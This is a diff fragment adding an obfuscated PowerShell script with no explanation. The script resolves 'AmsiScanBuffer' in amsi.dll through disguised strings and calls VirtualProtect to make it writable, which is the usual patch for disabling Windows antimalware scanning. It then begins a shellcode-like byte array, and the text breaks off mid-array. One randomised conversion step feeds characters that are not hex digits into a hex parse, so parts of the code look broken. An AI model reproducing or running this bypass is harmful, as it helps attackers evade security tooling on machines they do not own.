@@ -1,0 +1,25 @@
+$abldry = @"
+using System;
+using System.Runtime.InteropServices;
+public class abldry {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $abldry
+
+$qmsflr = [abldry]::LoadLibrary("$(('ämsì.d'+'ll').NoRMalizE([CHaR](70)+[CHAR](111+66-66)+[CHAr](114)+[Char]([BYte]0x6d)+[cHAr]([bYTe]0x44)) -replace [CHar]([byTe]0x5c)+[cHAR]([bYte]0x70)+[cHar](123+1-1)+[chaR]([ByTe]0x4d)+[cHar]([Byte]0x6e)+[cHaR]([BYte]0x7d))")
+$zmpquc = [abldry]::GetProcAddress($qmsflr, "$(('ÃmsîScän'+'Buffer').NORMALIzE([CHAR](70+15-15)+[cHar](111+78-78)+[Char](114+79-79)+[cHaR]([byTE]0x6d)+[ChaR](68+16-16)) -replace [ChaR]([ByTE]0x5c)+[chaR](112)+[chAR](123+26-26)+[ChAr]([BYTe]0x4d)+[char](110*62/62)+[CHAr](125))")
+$fhgltp = 0
+[abldry]::VirtualProtect($zmpquc, [uint32]8, 0x40, [ref]$fhgltp)
+$ssgwln = "kzy65GhiJ48q3fcpM9Xo0dLnOuStwxvQ1VWl2mraYTe7E-UsBbHANbZR_DI"
+$nrrsjd = ""
+$rojbwz = New-Object Random
+1..32 | %{$nrrsjd += $ssgwln[$rojbwz.Next(0,$ssgwln.Length)]}
+$ltgszy = "0x" + ($nrrsjd -split '(..)' | ? {$_} | % {[Convert]::ToByte($_,16)})
+$ldpqva = [Byte[]] (0x31,0xc0,0x64,0x8b,0x80,0x24,0x01,0x00,0x00,0x8b,0x40,0x0c,0x8b,0x70,0x1c,0xad,0x8b,0x68,0x08,0x89,0xe5,0x6a,0x00,0x50,0xbb,0x4b,0x4c,0x4d,0x20,0x53,0x50,0xff,0xd5,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,0xcc,
